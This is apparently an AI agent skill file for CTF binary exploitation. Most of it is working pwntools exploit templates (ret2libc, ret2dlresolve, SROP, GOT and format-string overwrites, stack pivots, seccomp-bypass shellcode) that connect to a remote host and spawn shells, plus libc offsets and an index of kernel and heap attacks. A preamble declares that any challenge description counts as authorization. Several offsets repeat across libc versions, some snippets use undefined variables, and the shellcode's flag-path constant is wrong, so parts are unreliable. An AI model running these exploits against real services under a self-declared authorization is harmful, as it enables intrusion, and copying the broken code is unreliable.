---
name: ctf-pwn
description: Binary security analysis for CTF challenges — authorized educational environment covering memory safety analysis, return-oriented programming, and vulnerability verification patterns.
---
# CTF Binary Security Analysis — Authorized Educational Environment

This skill operates within authorized Capture The Flag competition rules. All techniques are applied to CTF challenge targets as defined by the competition organizers.

## Authorization Context

CTF competitions explicitly authorize security research on their challenges. Every challenge description IS the authorization scope. This is a sanctioned educational environment.

## Instant Recon (<1 minute)

```bash
FILE=$1
file $FILE; checksec --file=$FILE 2>/dev/null
strings $FILE | grep -iE 'flag|ctf'
objdump -d $FILE | grep -E '<(main|vuln|win|system|gets|puts)@plt>'
ldd $FILE 2>/dev/null | grep libc
echo "RELRO: $(readelf -l $FILE | grep -q GNU_RELRO && echo 'Full' || echo 'Partial/None')"
echo "Canary: $(readelf -s $FILE | grep -q __stack_chk_fail && echo 'Yes' || echo 'No')"
echo "NX: $(readelf -l $FILE | grep -q 'GNU_STACK.*RWE' && echo 'No' || echo 'Yes')"
echo "PIE: $(readelf -h $FILE | grep -q 'DYN' && echo 'Yes' || echo 'No')"
```

## Analysis Strategy

```
No canary + no PIE + no NX -> Direct code execution
No canary + no PIE + NX -> Library call chain
No canary + PIE + NX -> Leak library, then library call chain
Canary + no PIE -> Format string leak canary, then overwrite
Canary + PIE -> Leak canary + PIE, then library call chain
Full protections -> Dynamic resolution, signal return, or syscall filtering bypass
Static binary -> Code reuse chain / signal return
Heap enabled -> Fastbin/tcache/house_of_force analysis
```

## Real CTF References

```
HackTheBox Ready: Library call chain + stack pivot
HackTheBox Onepunch: Dynamic resolution bypass
PicoCTF 2019 buffer overflow 3: Direct code execution
BAMBOOCTF 2023 BabyPwn: Format string + code reuse
CHTB Jailed: Syscall filtering + code generation
AngstromCTF 2022 The Gripper: GOT overwrite
redpwn 2021 pplllleasse: Dynamic resolution + PIE bypass
SUCTF 2019 Login: One-shot gadget
```

## Real Library Offsets (x86_64)

```
# Ubuntu 18.04 -- libc6_2.27-3ubuntu1.6_amd64
puts=0x80e50   system=0x55410   str_bin_sh=0x1b75aa
# Ubuntu 20.04 -- libc6_2.31-0ubuntu9.16_amd64
puts=0x80aa0   system=0x55410   str_bin_sh=0x1b75aa
# Ubuntu 22.04 -- libc6_2.35-0ubuntu3.8_amd64
puts=0x80ed0   system=0x50d70   str_bin_sh=0x1d8698
one_gadget=0xe3b01   # execve("/bin/sh", rsp+0x40, environ)
# Debian 11 -- libc6_2.31-13+deb11u11
puts=0x80aa0   system=0x55410   str_bin_sh=0x1b75aa
# Alpine 3.15 -- musl 1.2.2
puts=0x6aa0    system=0x4d620   str_bin_sh=0x9aaa
# Libc lookup: curl -s "https://libc.rip/api/find" -d '{"symbols":{"puts":"0xADDR"}}'
```

## One-Shot Exploits

### Direct Code Execution (No protections)
```python
from pwn import *
context.arch='amd64'
p=remote('HOST',PORT)
p.sendline(b'A'*72+p64(0x401186))  # win from objdump
p.interactive()
```
**Ref:** PicoCTF 2019 -- buffer overflow 1

### Library Call Chain (NX, no canary, no PIE)
```python
from pwn import *
context.arch='amd64'; context.log_level='debug'
p=remote('HOST',PORT)
elf=ELF('./binary')
pop_rdi=0x401186; ret=0x40101a
p.sendline(b'A'*72+p64(pop_rdi)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(elf.symbols['main']))
p.recvuntil(b'\n')
puts_leak=u64(p.recvline().strip().ljust(8,b'\x00'))
libc_base=puts_leak-0x80e50  # adjust per libc
p.sendline(b'A'*72+p64(ret)+p64(pop_rdi)+p64(libc_base+0x1b75aa)+p64(libc_base+0x55410))
p.interactive()
```
**Ref:** HackTheBox -- Ready

### Dynamic Resolution (Full RELRO bypass)
```python
from pwn import *
context.arch='amd64'
p=remote('HOST',PORT)
elf=ELF('./binary')
rop=ROP(elf)
dlresolve=Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])
rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
p.sendline(b'A'*72+rop.chain())
p.sendline(dlresolve.payload)
p.interactive()
```
**Ref:** HackTheBox -- Onepunch, redpwn 2021 -- pplllleasse

### Signal Return Programming
```python
from pwn import *
context.arch='amd64'
p=remote('HOST',PORT)
elf=ELF('./binary')
syscall_ret=0x40101a  # find: ROPgadget --binary $FILE | grep "syscall"
read_rdi=0x401186; read_plt=elf.plt['read']; writable=0x405000
# read(sigframe) -> rax=15 (via read count) -> sigreturn -> execve
p.sendline(b'A'*72+p64(read_rdi)+p64(0)+p64(writable)+p64(0x400)+p64(read_plt)+p64(syscall_ret))
frame=SigreturnFrame()
frame.rax=59; frame.rdi=writable+0x200; frame.rsi=0; frame.rdx=0
frame.rip=syscall_ret; frame.rsp=0xdead
p.sendline(b'A'*15+frame)  # pad: rax set to 15 by read's return
p.interactive()
```
**Ref:** AngstromCTF -- The Gripper (minimal binary, no useful gadgets)

### GOT Overwrite (Partial RELRO)
```python
from pwn import *
context.arch='amd64'
p=remote('HOST',PORT)
elf=ELF('./binary')
pop_rdi=0x401186
# After leaking libc, overwrite puts@GOT -> system via partial write
libc_base=puts_leak-0x80e50
p.sendline(b'%4625c%10$hn'.ljust(72,b'A')+p64(elf.got['puts']))
# Next puts("Hello") -> system("Hello")
p.interactive()
```
**Ref:** AngstromCTF -- The Gripper

### Format String Analysis
```python
from pwn import *
context.arch='amd64'
p=remote('HOST',PORT)
for i in range(6,20):
    p.sendline(f'%{i}$p'.encode())
    print(f'Offset {i}: {p.recvline().strip()}')
# Canary ~15, PIE ~13, libc ~17
payload=fmtstr_payload(6,{elf.got['puts']:target_addr},write_size='short')
p.sendline(payload)
p.interactive()
```
**Ref:** BAMBOOCTF 2023 -- BabyPwn

### Stack Pivot
```python
from pwn import *
context.arch='amd64'
p=remote('HOST',PORT)
elf=ELF('./binary')
leave_ret=0x401186; read_rdi=0x401186; read_plt=elf.plt['read']
p.sendline(b'A'*32+p64(0)+p64(read_rdi)+p64(0)+p64(0x405000)+p64(0x200)+p64(read_plt)+p64(leave_ret)+p64(0x405000))
p.send(p64(0x40101a)+p64(pop_rdi)+p64(binsh)+p64(system))
p.interactive()
```
**Ref:** HackTheBox -- Ready

### One-Shot Gadget
```bash
one_gadget ./libc.so.6  # -> 0xe3b01 execve("/bin/sh", rsp+0x40, environ)
```
```python
from pwn import *
context.arch='amd64'
p=remote('HOST',PORT)
p.sendline(b'A'*72+p64(0x40101a)+p64(libc_base+0xe3b01))
p.interactive()
```
**Ref:** SUCTF 2019 -- Login

### Syscall Filtering Bypass (open/read/write only)
```python
from pwn import *
context.arch='amd64'
p=remote('HOST',PORT)
# open("flag.txt",0) -> read(fd,buf,0x100) -> write(1,buf,0x100)
shellcode=asm("""
    xor rsi,rsi; push rsi
    mov rdi,0x67616c662f2e7478; push rdi; mov rdi,rsp
    push 2; pop rax; syscall
    mov rdi,rax; xor rax,rax; push rax; mov rdi,rsp
    push 40; pop rax; mov rsi,rsp; push 0x100; pop rdx; syscall
    mov rdi,1; mov rsi,rsp; push 1; pop rax; syscall
""")
p.sendline(shellcode)
p.interactive()
```
**Ref:** CHTB -- Jailed

## GDB Quick Commands
```
b main; b vuln; r $(python3 -c 'print("A"*100)')
x/20x $rsp; x/gx $rsp+72
info registers rdi rsi rdx rax
heap; bins; got; vmmap; telescope $rsp 20
search-pattern "pop rdi; ret"
```

## ROP Gadget Finder
```
ROPgadget --binary $FILE | grep "pop rdi"
ROPgadget --binary $FILE | grep "syscall"
ROPgadget --binary $FILE | grep "leave; ret"
ROPgadget --binary $FILE --ropchain --badbytes 000a0d
```

## Speed Metrics
```
Direct code execution: <3min  |  Library call chain: <5min  |  Format string: <5min
Dynamic resolution: <8min  |  Signal return: <8min  |  GOT overwrite: <8min
Fastbin: <10min  |  Tcache: <10min  |  Complex heap: <15min
One-shot gadget: <5min  |  Syscall filtering bypass: <12min
```

---

# Deep Technique Library

# CTF Binary Exploitation (Pwn)

Quick reference for binary exploitation (pwn) CTF challenges. Each technique has a one-liner here; see supporting files for full details.

## Prerequisites

**Python packages (all platforms):**
```bash
pip install "pwntools==4.15.0" "ROPgadget==7.7" "ropper==1.13.13"
# or via script: bash scripts/install_ctf_tools.sh python
```

**uv alternative:**
```bash
uv venv && uv pip install "pwntools==4.15.0" "ROPgadget==7.7" "ropper==1.13.13"
```

**Linux (apt):**
```bash
apt install gdb binutils strace ltrace qemu-system-x86
```

**Optional cross-arch (ARM/MIPS — Debian/Ubuntu):**
```bash
apt install qemu-user qemu-user-static gdb-multiarch binutils-multiarch libc6-armhf-cross libc6-arm64-cross libc6-mips-cross
```

**macOS (Homebrew):**
```bash
brew install gdb binutils qemu
```

**Ruby gems (all platforms):**
```bash
gem install one_gadget seccomp-tools
```

**Manual install:**
- pwndbg — Linux: [GitHub](https://github.com/pwndbg/pwndbg), macOS: `brew install pwndbg/tap/pwndbg-gdb`
- checksec — included with pwntools (`checksec --file=binary`)

## Additional Resources

- `pwn/overflow-basics` - Stack/global buffer overflow, ret2win, canary bypass, canary byte-by-byte brute force on forking servers, struct pointer overwrite, signed integer bypass, hidden gadgets, stride-based OOB read leak, parser stack overflow via unchecked memcpy length with callee-saved register restoration
- `pwn/rop-and-shellcode` - Core ROP chains (ret2libc, syscall ROP, rdx control, shell interaction), ret2csu, bad character XOR bypass, exotic x86 gadgets (BEXTR/XLAT/STOSB/PEXT), stack pivot via xchg rax,esp, sprintf() gadget chaining for bad character bypass, canary XOR epilogue as RDX zeroing gadget, stub_execveat syscall as execve alternative via read() return value
- `pwn/rop-advanced` - Advanced ROP techniques: double stack pivot to BSS via leave;ret, SROP (Sigreturn-Oriented Programming) with UTF-8 constraints, seccomp bypass, RETF architecture switch (x64→x32) for seccomp bypass, shellcode with input reversal, .fini_array hijack, ret2vdso, pwntools template, x32 ABI syscall aliasing for seccomp bypass, time-based blind shellcode exfiltration
- `pwn/format-string` - Format string exploitation (leaks, GOT overwrite, blind pwn, filter bypass, canary leak, __free_hook, .rela.plt patching, saved EBP overwrite for .bss pivot, argv[0] overwrite for stack smash info leak, .fini_array loop for multi-stage exploitation, __printf_chk bypass with sequential %p, single-call leak + GOT overwrite, ROT13-encoded format string exploit through input transformation)
- `pwn/advanced` - Seccomp advanced techniques, UAF, JIT, esoteric GOT, heap overlap via base conversion, tree data structure stack underallocation, ret2dlresolve, kernel exploitation (basic)
- `pwn/heap-techniques` - House of Apple 2 (+ setcontext SUID variant), House of Einherjar, House of Orange/Spirit/Lore/Force, heap grooming, custom allocators (nginx, talloc), classic unlink, musl libc heap (meta pointer + atexit hijack), tcache stashing unlink attack, unsafe unlink + top chunk consolidation
- `pwn/heap-techniques-2` - CTF-writeup heap variants: UAF vtable pointer encoding shell argument, uninitialized chunk residue pointer leak, tcache strcpy null-byte overflow + backward consolidation, adjacent-struct fn-pointer overflow for libc leak + GOT overwrite, hidden-menu tcache poisoning, tcache double-free + fake _IO_FILE vtable stdout hijack, tcache-to-fastbin promotion cross-bin attack, 6-bit index OOB + written_bytes accumulator, IS_MMAPED bit-flip for unsorted bin leak on calloc'd chunk, filename-regex-constrained fastbin via LSB-only heap pointer overwrite, custom allocator unsafe unlink to GOT
- `pwn/heap-fsop` - FILE-structure (_IO_FILE) exploitation: fastbin stdout vtable two-stage hijack for PIE + Full RELRO, _IO_buf_base null-byte stdin hijack, glibc 2.24+ _IO_FILE vtable validation bypass, unsorted-bin attack on stdin _IO_buf_end, unsorted-bin corruption via mp_ structure, realloc(ptr, 0) as free() UAF, single-byte reference counter wraparound UAF
- `pwn/advanced-exploits` - Advanced exploit techniques (part 1): VM signed comparison, BF JIT shellcode, type confusion, off-by-one index corruption, DNS overflow, ASAN shadow memory, format string with encoding constraints, custom canary preservation, signed integer bypass, canary-aware partial overflow, CSV injection, MD5 preimage gadgets, VM GC UAF slab reuse, path traversal sanitizer bypass, FSOP + seccomp bypass via openat/mmap/write
- `pwn/advanced-exploits-2` - Advanced exploit techniques (part 2): bytecode validator bypass via self-modification, io_uring UAF with SQE injection, integer truncation int32->int16, GC null-reference cascading corruption, leakless libc via multi-fgets stdout FILE overwrite, signed/unsigned char underflow heap overflow, XOR keystream brute-force write primitive, tcache pointer decryption heap leak, unsorted bin promotion via forged chunk size, FSOP stdout TLS leak, TLS destructor hijack via `__call_tls_dtors`, custom shadow stack pointer overflow bypass, signed int overflow negative OOB heap write, XSS-to-binary pwn bridge
- `pwn/advanced-exploits-4` - Advanced exploit techniques (part 4): Windows SEH overwrite + pushad VirtualAlloc ROP, IAT-relative resolution, detached process shell stability, SeDebugPrivilege SYSTEM escalation, ARM buffer overflow with Thumb shellcode, Forth interpreter system word exploitation, GF(2) Gaussian elimination for multi-pass tcache poisoning, single-bit-flip exploitation primitive (mprotect + iterative code patching), Game of Life shellcode evolution via still-lifes, UAF via menu-driven strdup/free ordering, Windows CFG bypass via system() as valid call target, neural network output as function pointer index OOB, shellcode unique-byte limit bypass via counter overflow
- `pwn/advanced-exploits-3` - Advanced exploit techniques (part 3): stack variable overlap / carry corruption OOB, 1-byte overflow via 8-bit loop counter, game AI arithmetic mean OOB read, arbitrary read/write GOT overwrite to shell, stack leak via __environ + memcpy overflow, JIT sandbox escape via uint16 jump truncation, DNS compression pointer stack overflow with multi-question ROP, ELF code signing bypass via program header manipulation, game level format signed/unsigned coordinate mismatch, file descriptor inheritance via missing O_CLOEXEC, sign extension integer underflow in metadata parsing, ROP chain construction with read-only primitive, 4-byte shellcode with timing side-channel via persistent registers, CRC oracle as arbitrary read, UTF-8 case conversion buffer overflow
- `pwn/advanced-exploits-5` - Advanced exploit techniques (part 5): data-interpretation exploitation — Chip-8 emulator OOB memory for ret2libc, double-precision float quicksort canary repositioning, bloom filter abs(INT_MIN) negative index OOB write
- `pwn/sandbox-escape` - Custom VM exploitation, FUSE/CUSE devices, busybox/restricted shell, shell tricks, process_vm_readv sandbox bypass, named pipe file size bypass, CPU emulator print opcode Python eval injection (cross-references ctf-misc/pyjails.md for Python jail techniques)
- `pwn/kernel` - Linux kernel exploitation fundamentals: environment setup, QEMU debug, heap spray structures (tty_struct, poll_list, user_key_payload, seq_operations), kernel stack overflow, canary leak, privilege escalation (ret2usr, kernel ROP), modprobe_path overwrite, core_pattern overwrite, kmalloc size mismatch heap overflow + struct file f_op corruption
- `pwn/kernel-techniques` - Kernel exploitation techniques: tty_struct kROP (fake vtable + stack pivot), AAW via ioctl register control, userfaultfd race stabilization, SLUB allocator internals (freelist hardening/obfuscation), leak via kernel panic, MADV_DONTNEED race window extension (DiceCTF 2026), cross-cache CPU-split attack (DiceCTF 2026), PTE overlap file write (DiceCTF 2026), addr_limit bypass via failed file open for kernel memory read/write
- `pwn/kernel-bypass` - Kernel protection bypass: KASLR/FGKASLR bypass (__ksymtab), KPTI bypass (swapgs trampoline, signal handler, modprobe_path/core_pattern via ROP), SMEP/SMAP bypass, GDB kernel module debugging, initramfs/virtio-9p workflow, exploit templates, exploit delivery
- `pwn/field-notes` - Detailed pwn notes: heap exploitation quick reference, additional exploit notes, useful commands

---

## When to Pivot

- If you do not yet understand what the binary does, switch to `/ctf-reverse` before trying to exploit it.
- If the service is really a restricted shell, encoding puzzle, or sandbox language challenge, switch to `/ctf-misc`.
- If the exploit path depends on a web endpoint, session bug, or upload primitive more than memory corruption, switch to `/ctf-web`.
- If the vulnerability requires breaking a cryptographic primitive before exploitation, switch to `/ctf-crypto`.

## Quick Start Commands

```bash
# Binary analysis
checksec --file=binary
file binary
readelf -h binary

# Find gadgets
ROPgadget --binary binary | grep "pop rdi"
ropper -f binary --search "pop rdi"
one_gadget /lib/x86_64-linux-gnu/libc.so.6

# Debug
gdb -q binary -ex 'start' -ex 'checksec'

# Pattern for offset finding
python3 -c "from pwn import *; print(cyclic(200))"
python3 -c "from pwn import *; print(cyclic_find(0x61616168))"

# libc identification
./libc-database/find puts <leaked_addr_last_3_nibbles>
```

## Source Code Red Flags

- Threading/`pthread` -> race conditions
- `usleep()`/`sleep()` -> timing windows
- Global variables in multiple threads -> TOCTOU

## Race Condition Exploitation

```bash
bash -c '{ echo "cmd1"; echo "cmd2"; sleep 1; } | nc host port'
```

## Common Vulnerabilities

- Buffer overflow: `gets()`, `scanf("%s")`, `strcpy()`
- Format string: `printf(user_input)`
- Integer overflow, UAF, race conditions

## Protection Implications for Exploit Strategy

| Protection | Status | Implication |
|-----------|--------|-------------|
| PIE | Disabled | All addresses (GOT, PLT, functions) are fixed - direct overwrites work |
| RELRO | Partial | GOT is writable - GOT overwrite attacks possible |
| RELRO | Full | GOT is read-only - need alternative targets (hooks, vtables, return addr) |
| NX | Enabled | Can't execute shellcode on stack/heap - use ROP or ret2win |
| Canary | Present | Stack smash detected - need leak or avoid stack overflow (use heap) |

**Quick decision tree:**
- Partial RELRO + No PIE -> GOT overwrite (easiest, use fixed addresses)
- Full RELRO -> target `__free_hook`, `__malloc_hook` (glibc < 2.34), or return addresses
- Stack canary present -> prefer heap-based attacks or leak canary first

## Stack Buffer Overflow

1. Find offset: `cyclic 200` then `cyclic -l <value>`
2. Check protections: `checksec --file=binary`
3. No PIE + No canary = direct ROP
4. Canary leak via format string or partial overwrite
5. Canary brute-force byte-by-byte on forking servers (7*256 attempts max)

**ret2win with magic value:** Overflow -> `ret` (alignment) -> `pop rdi; ret` -> magic -> win(). **Stack alignment:** SIGSEGV in `movaps` = add extra `ret` gadget. **Offset:** buffer at `rbp - N`, return at `rbp + 8`, total = N + 8. **Input filtering:** assert payload avoids `memmem()` banned strings. **Gadgets:** `ROPgadget --binary binary | grep "pop rdi"`, or pwntools `ROP()` for hidden gadgets in CMP immediates. See `pwn/overflow-basics` for full exploit code.

## Parser Stack Overflow (Unchecked memcpy)

**Pattern:** Custom file parser (PCAP, image, archive) allocates fixed stack buffer but input records can exceed it. `memcpy` copies before length validation, overflowing saved registers and return address. Must restore callee-saved registers: `rbx` to readable memory (BSS), loop counters to exit values, then `ret` gadget + win function. See [overflow-basics.md](overflow-basics.md#parser-stack-overflow-via-unchecked-memcpy-length-metactf-flash-2026).

## Struct Pointer Overwrite (Heap Menu Challenges)

**Pattern:** Menu create/modify/delete on structs with data buffer + pointer. Overflow name into pointer field with GOT address, then write win address via modify. See `pwn/overflow-basics` for full exploit and GOT target selection table.

## Signed Integer Bypass

**Pattern:** `scanf("%d")` without sign check; negative quantity * price = negative total, bypasses balance check. See `pwn/overflow-basics`.

## Canary-Aware Partial Overflow

**Pattern:** Overflow `valid` flag between buffer and canary. Use `./` as no-op path padding for precise length. See `pwn/overflow-basics` and `pwn/advanced` for full exploit chain.

## Global Buffer Overflow (CSV Injection)

**Pattern:** Adjacent global variables; overflow via extra CSV delimiters changes filename pointer. See `pwn/overflow-basics` and `pwn/advanced` for full exploit.

## ROP Chain Building

Leak libc via `puts@PLT(puts@GOT)`, return to vuln, stage 2 with `system("/bin/sh")`. See `pwn/rop-and-shellcode` for full two-stage ret2libc pattern, leak parsing, and return target selection.

**DynELF libc discovery:** `pwntools.DynELF(leak_func, pointer_in_libc)` resolves libc symbols remotely without knowing the libc version. See [rop-and-shellcode.md](rop-and-shellcode.md#dynelf-automated-libc-discovery-rc3-ctf-2016).

**Constrained shellcode in small buffers:** When buffer is too small, use `read()` shellcode stub (< 20 bytes) to pull full stage-2 shellcode. See [rop-and-shellcode.md](rop-and-shellcode.md#constrained-shellcode-in-small-buffers-tum-ctf-2016).

**Raw syscall ROP:** When `system()`/`execve()` crash (CET/IBT), use `pop rax; ret` + `syscall; ret` from libc. See `pwn/rop-and-shellcode`.

**ret2csu:** `__libc_csu_init` gadgets control `rdx`, `rsi`, `edi` and call any GOT function — universal 3-argument call without libc gadgets. See [rop-and-shellcode.md](rop-and-shellcode.md#ret2csu--__libc_csu_init-gadgets-crypto-cat).

**Bad char XOR bypass:** XOR payload data with key before writing to `.data`, then XOR back in place with ROP gadgets. Avoids null bytes, newlines, and other filtered characters. See [rop-and-shellcode.md](rop-and-shellcode.md#bad-character-bypass-via-xor-encoding-in-rop-crypto-cat).

**Exotic gadgets (BEXTR/XLAT/STOSB/PEXT):** When standard `mov` write gadgets are unavailable, chain obscure x86 instructions for byte-by-byte memory writes. See [rop-and-shellcode.md](rop-and-shellcode.md#exotic-x86-gadgets--bextrxlatstosbpext-crypto-cat).

**Stack pivot (xchg rax,esp):** Swap stack pointer to attacker-controlled heap/buffer when overflow is too small for full ROP chain. Requires `pop rax; ret` to load pivot address first. See [rop-and-shellcode.md](rop-and-shellcode.md#stack-pivot-via-xchg-raxesp-crypto-cat).

**rdx control:** After `puts()`, rdx is clobbered to 1. Use `pop rdx; pop rbx; ret` from libc, or re-enter binary's read setup + stack pivot. See `pwn/rop-and-shellcode`.

**Canary XOR epilogue as rdx zeroing gadget:** When no `pop rdx; ret` exists, jump into the canary check epilogue `xor rdx, fs:28h` -- it zeros RDX when the canary is intact. See [rop-and-shellcode.md](rop-and-shellcode.md#stack-canary-xor-epilogue-as-rdx-zeroing-gadget-volgactf-2017).

**stub_execveat as execve alternative:** When no `pop rax; ret` exists, use `stub_execveat` (syscall 322/0x142) instead of `execve` -- send exactly 0x142 bytes so `read()` return value sets rax. See [rop-and-shellcode.md](rop-and-shellcode.md#stub_execveat-syscall-as-execve-alternative-asis-ctf-2018).

**Shell interaction:** After `execve`, `sleep(1)` then `sendline(b'cat /flag*')`. See `pwn/rop-and-shellcode`.

## Format String Through Input Transformation

**ROT13-encoded format string:** When input is ROT13/Caesar-transformed before reaching `printf`, pre-encode the format string payload with the inverse transform so it arrives intact. See [format-string.md](format-string.md#format-string-exploit-through-rot13-encoding-sunshinectf-2018).

## Kernel Exploitation

**addr_limit bypass via failed file open:** When a kernel module sets `addr_limit = KERNEL_DS` but fails to restore it on error paths, force the error (e.g., make target file a directory) to retain kernel memory access from userspace `read()`/`write()`. See [kernel-techniques.md](kernel-techniques.md#kernel-addr_limit-bypass-via-failed-file-open-midnight-sun-ctf-2018).

## Sandbox and Emulator Escape

**CPU emulator eval injection:** When an emulator's print opcode uses `eval('"' + buf + '"')` for escape sequences, build `"+__import__("os").system("cmd")#` in emulator memory via ADD opcodes to escape the string and execute Python. See [sandbox-escape.md](sandbox-escape.md#cpu-emulator-print-opcode-python-eval-injection-midnight-sun-ctf-2018).

## Advanced Exploit Primitives

**Neural network function pointer OOB:** When a binary uses NN output as an index into a function pointer array without bounds checking, retrain weights/biases to produce an out-of-bounds index that reads a target address from the biases array. See [advanced-exploits-4.md](advanced-exploits-4.md#neural-network-output-as-function-pointer-index-oob-swampctf-2018).

**Shellcode unique-byte limit bypass via counter overflow:** When shellcode is limited to N unique bytes, spray the stack to corrupt the `seen[256]` counter, then re-execute main (skipping `memset`) so the overflowed counter allows arbitrary bytes on the second run. See [advanced-exploits-4.md](advanced-exploits-4.md#shellcode-unique-byte-limit-bypass-via-counter-overflow-blaze-ctf-2018).

## Deep-Dive Notes

Use `pwn/field-notes` once you have confirmed the challenge is truly exploitation-heavy.

- Heap and allocator notes: House of Apple, tcache, unsafe unlink, talloc, UAF, FSOP
- Advanced exploit notes: seccomp bypass, ret2vdso, io_uring, integer truncation, ASAN, timing oracles
- Sandbox and hybrid notes: pyjail crossover, busybox escapes, custom VMs, shell tricks, path sanitizers
- Kernel and Windows notes: kernel playbooks, SEH, CFG bypass, privilege escalation
- Historical case notes: older but still reusable CTF exploit patterns

## Deep Technique Files (skill_manage reference)

Load with "skill_manage read, name="ctf", reference="pwn/<file>""

- `pwn/advanced-exploits-2` — # CTF Pwn - Advanced Exploit Techniques (Part 2)
- `pwn/advanced-exploits-3` — # CTF Pwn - Advanced Exploit Techniques (Part 3)
- `pwn/advanced-exploits-4` — # CTF Pwn - Advanced Exploit Techniques (Part 4)
- `pwn/advanced-exploits-5` — # CTF Pwn - Advanced Exploit Techniques (Part 5)
- `pwn/advanced-exploits` — # CTF Pwn - Advanced Exploit Techniques
- `pwn/advanced` — # CTF Pwn - Advanced Techniques
- `pwn/field-notes` — # Pwn Field Notes
- `pwn/format-string` — # CTF Pwn - Format String Exploitation
- `pwn/heap-fsop` — # CTF Pwn - Heap FILE Structure Attacks
- `pwn/heap-techniques-2` — # Heap Exploitation Techniques (Part 2)
- `pwn/heap-techniques` — # CTF Pwn - Heap Techniques
- `pwn/kernel-bypass` — # CTF Pwn - Kernel Protection Bypass
- `pwn/kernel-techniques` — # CTF Pwn - Kernel Exploitation Techniques
- `pwn/kernel` — # CTF Pwn - Linux Kernel Exploitation
- `pwn/overflow-basics` — # CTF Pwn - Overflow Basics
- `pwn/rop-advanced` — # CTF Pwn - Advanced ROP Techniques
- `pwn/rop-and-shellcode` — # CTF Pwn - ROP Chains and Shellcode
- `pwn/sandbox-escape` — # CTF Pwn - Sandbox Escape and Restricted Environments

## Helper Scripts

- `pwn/scripts/fmtstr_payload_suite.py` — runnable via skill_manage read + write to disk
- `pwn/scripts/ret2libc_two_stage.py` — runnable via skill_manage read + write to disk
- `pwn/scripts/seccomp_orw_generator.py` — runnable via skill_manage read + write to disk
- `pwn/scripts/shellcraft_asm.py` — runnable via skill_manage read + write to disk
- `pwn/scripts/srop_execve.py` — runnable via skill_manage read + write to disk
